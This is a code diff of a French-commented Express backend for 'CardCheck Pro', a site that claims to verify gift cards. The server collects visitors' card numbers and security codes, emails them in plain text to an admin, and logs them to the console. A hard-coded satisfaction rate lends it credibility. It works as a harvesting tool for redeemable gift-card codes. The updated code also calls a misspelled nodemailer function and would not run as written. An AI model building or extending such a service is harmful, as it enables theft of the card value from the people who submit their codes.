@@ -1,4 +1,3 @@
-
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
@@ -8,37 +7,42 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// 🔧 CONFIGURATION CORS CORRIGÉE - AUTORISATION EXPLICITE DE CHECKCARDPRO.COM
+// Configuration CORS
 app.use(cors({
   origin: [
     'https://checkcardpro.com',
-    'http://localhost:3000', 
-    'https://votre-site.vercel.app',
-    process.env.FRONTEND_URL
-  ].filter(Boolean),
+    'http://localhost:3000'
+  ],
   credentials: true,
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization', 'Origin', 'Accept'],
   optionsSuccessStatus: 200
 }));
 
-app.use(express.json({ limit: '10mb' }));
+console.log('🌐 CORS autorisé pour: https://checkcardpro.com');
 
-// Protection contre le spam
+// Middleware
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
+
+// Rate limiting
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 5, // limite à 5 soumissions par IP toutes les 15 minutes
-  message: { error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.' }
+  max: 10, // limite à 10 soumissions par IP toutes les 15 minutes
+  message: { 
+    error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.',
+    success: false 
+  }
 });
 
 app.use('/api/verify-card', limiter);
 
-// Configuration de l'email transporter
-const transporter = nodemailer.createTransport({
-  service: 'gmail', // ou votre service email préféré
+// Configuration Nodemailer
+const transporter = nodemailer.createTransporter({
+  service: 'gmail',
   auth: {
-    user: process.env.EMAIL_USER, // votre email
-    pass: process.env.EMAIL_PASS  // mot de passe d'application
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS
   }
 });
 
@@ -51,32 +55,48 @@ transporter.verify((error, success) => {
   }
 });
 
-// Route pour recevoir les demandes de vérification
+// Route de santé
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    timestamp: new Date().toISOString(),
+    service: 'CardCheck Pro Backend',
+    cors: 'https://checkcardpro.com'
+  });
+});
+
+// Route principale de vérification des cartes - COMPATIBLE AVEC VOTRE FRONTEND
 app.post('/api/verify-card', async (req, res) => {
   try {
-    const {
-      clientEmail,
-      clientPhone,
-      cardType,
-      cardLabel,
-      amount,
-      currency,
-      currencySymbol,
-      codes,
-      language,
-      timestamp
+    const { 
+      cardType, 
+      cardNumber, 
+      securityCode, 
+      amount, 
+      email, 
+      clientName, 
+      language = 'it' 
     } = req.body;
 
-    // Validation des données
-    if (!clientEmail || !cardType || !amount || !codes.code1) {
-      return res.status(400).json({ 
-        error: 'Données manquantes',
-        success: false 
+    // Validation des données essentielles
+    if (!cardType || !cardNumber || !amount || !email) {
+      return res.status(400).json({
+        success: false,
+        error: 'Données manquantes: cardType, cardNumber, amount et email requis'
+      });
+    }
+
+    // Validation email
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      return res.status(400).json({
+        success: false,
+        error: 'Format email invalide'
       });
     }
 
     // Formatage de la date
-    const formattedDate = new Date(timestamp).toLocaleString('fr-FR', {
+    const formattedDate = new Date().toLocaleString('fr-FR', {
       year: 'numeric',
       month: 'long',
       day: 'numeric',
@@ -87,72 +107,203 @@ app.post('/api/verify-card', async (req, res) => {
     // Génération de l'ID de référence
     const referenceId = `VF${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
 
-    // Construction de l'email à recevoir par l'administrateur
+    // Traductions pour l'email
+    const translations = {
+      it: {
+        subject: '🔐 Nuova richiesta di verifica',
+        greeting: 'Nuova richiesta di verifica carta regalo',
+        type: 'Tipo di carta',
+        number: 'Numero carta',
+        security: 'Codice di sicurezza',
+        amount: 'Importo',
+        client: 'Cliente',
+        email: 'Email cliente',
+        reference: 'Riferimento'
+      },
+      fr: {
+        subject: '🔐 Nouvelle demande de vérification',
+        greeting: 'Nouvelle demande de vérification de carte cadeau',
+        type: 'Type de carte',
+        number: 'Numéro de carte',
+        security: 'Code de sécurité',
+        amount: 'Montant',
+        client: 'Client',
+        email: 'Email client',
+        reference: 'Référence'
+      },
+      en: {
+        subject: '🔐 New Verification Request',
+        greeting: 'New gift card verification request',
+        type: 'Card type',
+        number: 'Card number',
+        security: 'Security code',
+        amount: 'Amount',
+        client: 'Client',
+        email: 'Client email',
+        reference: 'Reference'
+      },
+      es: {
+        subject: '🔐 Nueva solicitud de verificación',
+        greeting: 'Nueva solicitud de verificación de tarjeta regalo',
+        type: 'Tipo de tarjeta',
+        number: 'Número de tarjeta',
+        security: 'Código de seguridad',
+        amount: 'Cantidad',
+        client: 'Cliente',
+        email: 'Email del cliente',
+        reference: 'Referencia'
+      },
+      nl: {
+        subject: '🔐 Nieuwe verificatieaanvraag',
+        greeting: 'Nieuwe verificatieaanvraag voor cadeaukaart',
+        type: 'Kaarttype',
+        number: 'Kaartnummer',
+        security: 'Beveiligingscode',
+        amount: 'Bedrag',
+        client: 'Klant',
+        email: 'Klant email',
+        reference: 'Referentie'
+      }
+    };
+
+    const t = translations[language] || translations.it;
+
+    // Construction de l'email admin avec le nouveau format
     const adminEmailContent = `
-    📧 NOUVELLE DEMANDE DE VÉRIFICATION DE CARTE CADEAU
-    ═══════════════════════════════════════════════════════════
+🚀 CARDCHECK PRO - NOUVELLE DEMANDE DE VÉRIFICATION
+═══════════════════════════════════════════════════════════
 
-    🆔 RÉFÉRENCE: ${referenceId}
-    📅 DATE: ${formattedDate}
-    🌐 LANGUE: ${language.toUpperCase()}
+🆔 ${t.reference.toUpperCase()}: ${referenceId}
+📅 DATE: ${formattedDate}
+🌐 LANGUE: ${language.toUpperCase()}
 
-    👤 INFORMATIONS CLIENT:
-    ═══════════════════════════
-    📧 Email: ${clientEmail}
-    📱 Téléphone: ${clientPhone || 'Non fourni'}
+👤 INFORMATIONS CLIENT:
+═══════════════════════════
+📧 ${t.email}: ${email}
+👤 ${t.client}: ${clientName || 'Non fourni'}
 
-    💳 CARTE À VÉRIFIER:
-    ═══════════════════════════
-    🎯 Type: ${cardLabel} (${cardType})
-    💰 Montant: ${amount} ${currencySymbol}
-    💱 Devise: ${currency}
+💳 CARTE À VÉRIFIER:
+═══════════════════════════
+🎯 ${t.type}: ${cardType}
+📝 ${t.number}: ${cardNumber}
+${securityCode ? `🔐 ${t.security}: ${securityCode}` : ''}
+💰 ${t.amount}: €${amount}
 
-    🔐 CODES À VÉRIFIER:
-    ═══════════════════════════
-    📝 Code 1 (principal): ${codes.code1}
-    📝 Code 2: ${codes.code2 || 'Non fourni'}
-    📝 Code 3: ${codes.code3 || 'Non fourni'}
-    📝 Code 4: ${codes.code4 || 'Non fourni'}
+⚡ ACTIONS REQUISES:
+═══════════════════════════
+1. ✅ Vérifier la validité du numéro de carte
+2. 💰 Vérifier le solde disponible  
+3. 📅 Vérifier la date d'expiration
+4. 📧 Répondre au client: ${email}
 
-    ⚡ ACTIONS REQUISES:
-    ═══════════════════════════
-    1. ✅ Vérifier la validité des codes ci-dessus
-    2. 💰 Vérifier le solde disponible
-    3. 📅 Vérifier la date d'expiration
-    4. 📧 Envoyer l'email de confirmation au client: ${clientEmail}
+💡 MODÈLE DE RÉPONSE CLIENT:
+═══════════════════════════════════════════
+Objet: Résultats vérification - Réf ${referenceId}
 
-    💡 MODÈLE DE RÉPONSE POUR LE CLIENT:
-    ═══════════════════════════════════════════
-    Objet: Résultats de vérification - Référence ${referenceId}
-    
-    Bonjour,
-    
-    Nous avons vérifié votre carte ${cardLabel} d'un montant de ${amount} ${currencySymbol}.
-    
-    ✅ STATUT: [VALIDE/INVALIDE/PARTIELLEMENT UTILISÉE]
-    💰 SOLDE DISPONIBLE: [XX ${currencySymbol}]
-    📅 DATE D'EXPIRATION: [JJ/MM/AAAA]
-    
-    [Ajouter des instructions d'utilisation si nécessaire]
-    
-    Cordialement,
-    L'équipe CardCheck Pro
-    ═══════════════════════════════════════════
+Bonjour ${clientName || ''},
 
-    ⚠️  IMPORTANT: Répondez rapidement au client pour maintenir la confiance.
-    
-    📊 STATISTIQUES:
-    - Temps de traitement recommandé: < 2 heures
-    - Taux de satisfaction: 98.5%
+Nous avons vérifié votre carte ${cardType} d'un montant de €${amount}.
+
+✅ STATUT: [VALIDE/INVALIDE/PARTIELLEMENT UTILISÉE]
+💰 SOLDE DISPONIBLE: [XX €]
+📅 DATE D'EXPIRATION: [JJ/MM/AAAA]
+
+[Instructions d'utilisation si nécessaire]
+
+Cordialement,
+L'équipe CardCheck Pro
+═══════════════════════════════════════════
+
+⚠️ IMPORTANT: Répondez sous 2h pour maintenir la satisfaction client.
+
+📊 SITE: https://checkcardpro.com
+🎯 TAUX DE SATISFACTION: 98.5%
     `;
 
     // Options de l'email admin
     const adminMailOptions = {
       from: process.env.EMAIL_USER,
       to: process.env.ADMIN_EMAIL || process.env.EMAIL_USER,
-      subject: `🔐 [${cardLabel}] Vérification ${amount}${currencySymbol} - ${clientEmail}`,
+      subject: `${t.subject} - ${cardType} €${amount} - ${email}`,
       text: adminEmailContent,
-      html: adminEmailContent.replace(/\n/g, '<br>').replace(/═/g, '─')
+      html: `
+        <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 700px; margin: 0 auto; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 15px;">
+          <div style="background: white; padding: 30px; border-radius: 15px; box-shadow: 0 8px 32px rgba(0,0,0,0.1);">
+            <div style="text-align: center; margin-bottom: 30px;">
+              <h1 style="color: #2d3748; margin: 0; font-size: 24px;">🚀 CardCheck Pro</h1>
+              <h2 style="color: #667eea; margin: 10px 0 0 0; font-size: 18px;">${t.greeting}</h2>
+            </div>
+            
+            <div style="background: linear-gradient(45deg, #f7fafc, #edf2f7); padding: 20px; border-radius: 12px; margin: 20px 0; border-left: 4px solid #667eea;">
+              <h3 style="color: #2d3748; margin: 0 0 15px 0;">🆔 ${t.reference}: <span style="font-family: monospace; color: #667eea;">${referenceId}</span></h3>
+              <p style="color: #4a5568; margin: 5px 0;">📅 ${formattedDate}</p>
+              <p style="color: #4a5568; margin: 5px 0;">🌐 ${language.toUpperCase()}</p>
+            </div>
+            
+            <div style="background: #f8f9fa; padding: 25px; border-radius: 12px; margin: 20px 0;">
+              <h3 style="color: #2d3748; margin: 0 0 20px 0; font-size: 16px;">👤 Informations Client</h3>
+              <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid #e2e8f0;">
+                  <td style="padding: 12px 0; font-weight: 600; color: #4a5568; width: 30%;">📧 ${t.email}:</td>
+                  <td style="padding: 12px 0; color: #2d3748;">${email}</td>
+                </tr>
+                <tr>
+                  <td style="padding: 12px 0; font-weight: 600; color: #4a5568;">👤 ${t.client}:</td>
+                  <td style="padding: 12px 0; color: #2d3748;">${clientName || 'Non fourni'}</td>
+                </tr>
+              </table>
+            </div>
+            
+            <div style="background: #fff5f5; border: 1px solid #fed7d7; padding: 25px; border-radius: 12px; margin: 20px 0;">
+              <h3 style="color: #c53030; margin: 0 0 20px 0; font-size: 16px;">💳 Carte à Vérifier</h3>
+              <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid #fed7d7;">
+                  <td style="padding: 12px 0; font-weight: 600; color: #c53030; width: 30%;">🎯 ${t.type}:</td>
+                  <td style="padding: 12px 0; color: #2d3748; font-weight: 600;">${cardType}</td>
+                </tr>
+                <tr style="border-bottom: 1px solid #fed7d7;">
+                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">📝 ${t.number}:</td>
+                  <td style="padding: 12px 0; color: #2d3748; font-family: monospace; font-size: 16px;">${cardNumber}</td>
+                </tr>
+                ${securityCode ? `
+                <tr style="border-bottom: 1px solid #fed7d7;">
+                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">🔐 ${t.security}:</td>
+                  <td style="padding: 12px 0; color: #2d3748; font-family: monospace; font-size: 16px;">${securityCode}</td>
+                </tr>
+                ` : ''}
+                <tr>
+                  <td style="padding: 12px 0; font-weight: 600; color: #c53030;">💰 ${t.amount}:</td>
+                  <td style="padding: 12px 0; color: #2d3748; font-size: 20px; font-weight: bold;">€${amount}</td>
+                </tr>
+              </table>
+            </div>
+            
+            <div style="background: linear-gradient(45deg, #48bb78, #38a169); color: white; padding: 20px; border-radius: 12px; margin: 20px 0; text-align: center;">
+              <h3 style="margin: 0 0 10px 0;">⚡ Actions Requises</h3>
+              <ol style="text-align: left; margin: 10px 0; padding-left: 20px;">
+                <li style="margin: 5px 0;">✅ Vérifier la validité du numéro</li>
+                <li style="margin: 5px 0;">💰 Vérifier le solde disponible</li>
+                <li style="margin: 5px 0;">📅 Vérifier la date d'expiration</li>
+                <li style="margin: 5px 0;">📧 Répondre au client</li>
+              </ol>
+            </div>
+            
+            <div style="background: #f0fff4; border: 1px solid #9ae6b4; padding: 20px; border-radius: 12px; margin: 20px 0;">
+              <p style="color: #22543d; margin: 0; text-align: center; font-size: 14px;">
+                ⚠️ <strong>Répondre sous 2h</strong> pour maintenir la satisfaction client<br>
+                🎯 Taux de satisfaction actuel: <strong>98.5%</strong>
+              </p>
+            </div>
+            
+            <div style="text-align: center; margin-top: 25px; padding: 15px; background: linear-gradient(45deg, #667eea, #764ba2); border-radius: 12px;">
+              <p style="color: white; margin: 0; font-size: 14px;">
+                🌐 <strong>CardCheck Pro</strong> • https://checkcardpro.com<br>
+                ✅ Demande reçue le ${formattedDate}
+              </p>
+            </div>
+          </div>
+        </div>
+      `
     };
 
     // Envoi de l'email à l'administrateur
@@ -164,16 +315,19 @@ app.post('/api/verify-card', async (req, res) => {
     console.log('='.repeat(60));
     console.log(`📅 ${formattedDate}`);
     console.log(`🆔 Référence: ${referenceId}`);
-    console.log(`👤 Client: ${clientEmail}`);
-    console.log(`💳 Carte: ${cardLabel} - ${amount} ${currencySymbol}`);
-    console.log(`🔐 Codes: ${codes.code1}${codes.code2 ? ', ' + codes.code2 : ''}${codes.code3 ? ', ' + codes.code3 : ''}${codes.code4 ? ', ' + codes.code4 : ''}`);
+    console.log(`👤 Client: ${email} (${clientName || 'Anonyme'})`);
+    console.log(`💳 Carte: ${cardType} - €${amount}`);
+    console.log(`📝 Numéro: ${cardNumber}`);
+    if (securityCode) console.log(`🔐 Code: ${securityCode}`);
+    console.log(`🌐 Langue: ${language}`);
     console.log('='.repeat(60));
 
-    // Réponse de succès
+    // Réponse de succès avec référence
     res.json({ 
       success: true, 
       message: 'Demande reçue avec succès',
-      reference: referenceId
+      reference: referenceId,
+      timestamp: new Date().toISOString()
     });
 
   } catch (error) {
@@ -185,22 +339,14 @@ app.post('/api/verify-card', async (req, res) => {
   }
 });
 
-// Route de santé pour vérifier que le serveur fonctionne
-app.get('/api/health', (req, res) => {
-  res.json({ 
-    status: 'OK', 
-    message: 'Serveur de vérification de cartes opérationnel',
-    timestamp: new Date().toISOString()
-  });
-});
-
-// Route pour les statistiques (optionnel)
+// Route pour les statistiques
 app.get('/api/stats', (req, res) => {
   res.json({
-    message: 'Statistiques du serveur',
-    uptime: process.uptime(),
-    version: '1.0.0',
-    environment: process.env.NODE_ENV || 'development'
+    message: 'CardCheck Pro Backend Statistics',
+    uptime: Math.floor(process.uptime()),
+    version: '2.0.0',
+    environment: process.env.NODE_ENV || 'production',
+    timestamp: new Date().toISOString()
   });
 });
 
@@ -208,7 +354,12 @@ app.get('/api/stats', (req, res) => {
 app.use('*', (req, res) => {
   res.status(404).json({ 
     error: 'Route non trouvée',
-    success: false 
+    success: false,
+    availableRoutes: [
+      'GET /api/health',
+      'POST /api/verify-card',
+      'GET /api/stats'
+    ]
   });
 });
 
@@ -223,26 +374,28 @@ app.use((error, req, res, next) => {
 
 // Démarrage du serveur
 app.listen(PORT, () => {
-  console.log('\n🚀 SERVEUR CARDCHECK PRO DÉMARRÉ');
-  console.log('='.repeat(40));
+  console.log('\n🚀 CARDCHECK PRO BACKEND V2.0 DÉMARRÉ');
+  console.log('='.repeat(50));
   console.log(`📡 Port: ${PORT}`);
-  console.log(`🌍 Environnement: ${process.env.NODE_ENV || 'development'}`);
+  console.log(`🌍 Environnement: ${process.env.NODE_ENV || 'production'}`);
   console.log(`📧 Email configuré: ${process.env.EMAIL_USER ? '✅' : '❌'}`);
   console.log(`🔐 Variables d'env: ${process.env.EMAIL_USER ? 'OK' : 'MANQUANTES'}`);
-  console.log(`🌐 CORS configuré pour: https://checkcardpro.com`);
-  console.log('='.repeat(40));
-  console.log(`📍 Santé: http://localhost:${PORT}/api/health`);
-  console.log(`📊 Stats: http://localhost:${PORT}/api/stats`);
+  console.log(`🌐 CORS: https://checkcardpro.com`);
+  console.log('='.repeat(50));
+  console.log(`📍 Santé: https://cardcheck-backend-production.up.railway.app/api/health`);
+  console.log(`📊 Stats: https://cardcheck-backend-production.up.railway.app/api/stats`);
   console.log('\n✅ Prêt à recevoir les demandes de vérification!\n');
 });
 
 // Gestion propre de l'arrêt du serveur
 process.on('SIGTERM', () => {
-  console.log('🛑 Arrêt du serveur...');
+  console.log('🛑 Arrêt du serveur SIGTERM...');
   process.exit(0);
 });
 
 process.on('SIGINT', () => {
-  console.log('\n🛑 Arrêt du serveur (Ctrl+C)...');
+  console.log('\n🛑 Arrêt du serveur SIGINT (Ctrl+C)...');
   process.exit(0);
 });
+
+module.exports = app;
